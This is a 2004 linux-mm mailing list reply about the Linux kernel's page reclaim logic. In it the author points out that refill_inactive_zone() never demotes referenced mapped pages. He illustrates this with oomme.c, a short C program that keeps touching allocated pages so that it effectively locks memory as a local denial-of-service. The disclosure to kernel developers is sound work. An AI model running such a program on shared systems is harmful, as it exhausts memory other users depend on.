From: Nikita Danilov <Nikita@Namesys.COM>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Message-ID: <16400.63379.453282.283117@laputa.namesys.com>
Date: Fri, 23 Jan 2004 13:29:39 +0300
Subject: Re: [BENCHMARKS] Namesys VM patches improve kbuild
In-Reply-To: <40105633.4000800@cyberone.com.au>
References: <400F630F.80205@cyberone.com.au>
	<20040121223608.1ea30097.akpm@osdl.org>
	<16399.42863.159456.646624@laputa.namesys.com>
	<40105633.4000800@cyberone.com.au>
Sender: owner-linux-mm@kvack.org
Return-Path: <owner-linux-mm@kvack.org>
To: Nick Piggin <piggin@cyberone.com.au>
Cc: Andrew Morton <akpm@osdl.org>, linux-mm@kvack.org
List-ID: <linux-mm.kvack.org>

Nick Piggin writes:
 > 

[...]

 > 
 > But those cold mapped pages are basically ignored until the
 > reclaim_mapped threshold, however they do continue to have their
 > referenced bits cleared - hence page_referenced check should
 > become a better estimation when reclaim_mapped is reached, right?

Right.

By the way here lies another problem: refill_inactive_zone() never
removes referenced mapped page from the active list. Which allows for
the simple DoS:

----oomme.c-----------------------------------------------------------
#include <stdlib.h>
#include <unistd.h>

int
main(int argc, char **argv)
{
        unsigned long memuse;
        char *base;
        char *scan;
        int   shift;
        int   i;

        memuse = strtoul(argv[1], NULL, 0);
        shift = getpagesize();

        base = malloc(memuse);
        if (base == NULL) {
                perror("malloc");
                exit(1);
        }

        for (i = 0;; ++i) {
                for (scan = base; scan < base + memuse; scan += shift)
                        *scan += i;
                printf("%i\n", i);
        }
}
----oomme.c-----------------------------------------------------------

This program will re-reference allocated pages much faster than VM
scanner(s) will be able to analyze and clear their reference bits. In
effect it mlocks memory.

 > 
 > 

Nikita.
--
To unsubscribe, send a message with 'unsubscribe linux-mm' in
the body to majordomo@kvack.org.  For more info on Linux MM,
see: http://www.linux-mm.org/ .
Don't email: <a href=mailto:"aart@kvack.org"> aart@kvack.org </a>
